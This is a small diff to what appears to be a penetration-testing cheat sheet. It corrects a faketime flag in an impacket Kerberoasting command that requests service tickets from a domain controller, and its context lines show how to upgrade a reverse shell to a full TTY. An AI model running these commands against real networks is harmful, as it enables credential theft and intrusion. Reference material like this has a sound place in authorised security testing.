@@ -593,7 +593,7 @@ Include multiple variations for different OS targets and filtering environments.
 
 ### Operational Workarounds
 - **Fix Kerberos Clock Skew (Faketime)**:
-  - `faketime -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
+  - `faketime -f -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
 - **Fix Failed "bash -i" (TTY Shell)**:
   - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
   - *Then*: `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`
